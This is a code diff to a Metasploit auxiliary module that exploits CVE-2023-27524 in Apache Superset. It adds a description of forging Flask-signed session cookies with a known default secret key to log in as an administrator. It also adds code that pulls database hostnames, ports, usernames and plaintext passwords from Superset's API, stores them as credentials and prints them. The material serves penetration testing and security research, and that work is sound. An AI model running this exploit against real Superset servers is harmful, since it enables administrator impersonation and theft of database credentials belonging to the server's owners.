@@ -13,18 +13,24 @@ class MetasploitModule < Msf::Auxiliary
       update_info(
         info,
         'Name' => 'Apache Superset Signed Cookie Priv Esc',
-        # The description can be multiple lines, but does not preserve formatting.
-        'Description' => 'Sample Auxiliary Module',
+        'Description' => %q{
+          Apache Superset versions <= 2.0.0 utilize Flask with a known default secret key which is used to sign HTTP cookies.
+          These cookies can therefore be forged. If a user is able to login to the site, they can decode the cookie, set their user_id to that
+          of an administrator, and re-sign the cookie. This valid cookie can then be used to login as the targeted user and retrieve database
+          credentials saved in Apache Superset.
+        },
         'Author' => [
           'h00die', # MSF module
           'paradoxis', #  original flask-unsign tool
-          'zeroSteiner' # MSF flask-unsign library
+          'zeroSteiner', # MSF flask-unsign library
+          'Naveen Sunkavally' # horizon3.ai writeup and cve discovery
         ],
         'References' => [
           ['URL', 'https://github.com/Paradoxis/Flask-Unsign'],
           ['URL', 'https://vulcan.io/blog/cve-2023-27524-in-apache-superset-what-you-need-to-know/'],
           ['URL', 'https://www.horizon3.ai/cve-2023-27524-insecure-default-configuration-in-apache-superset-leads-to-remote-code-execution/'],
           ['URL', 'https://github.com/horizon3ai/CVE-2023-27524/blob/main/CVE-2023-27524.py'],
+          ['EDB', '51447'],
           ['CVE', '2023-27524' ],
         ],
         'License' => MSF_LICENSE,
@@ -147,7 +153,29 @@ class MetasploitModule < Msf::Auxiliary
         print_status('Done enumerating databases')
         break
       end
-      puts res.body
+      result_json = res.get_json_document
+      db_name = result_json['result']['parameters']['database']
+      db_type = result_json['result']['backend']
+      db_host = result_json['result']['parameters']['host']
+      db_port = result_json['result']['parameters']['port']
+      db_pass = result_json['result']['parameters']['password']
+      db_user = result_json['result']['parameters']['username']
+      if framework.db.active
+        create_credential_and_login({
+          address: db_host,
+          port: db_port,
+          protocol: 'tcp',
+          workspace_id: myworkspace_id,
+          origin_type: :service,
+          service_name: db_type,
+          username: db_user,
+          private_type: :password,
+          private_data: db_pass,
+          module_fullname: fullname,
+          status: Metasploit::Model::Login::Status::UNTRIED
+        })
+      end
+      print_good("Found #{db_type} database #{db_name}: #{db_user}:#{db_pass}@#{db_host}:#{db_port}")
     end
   end
 end
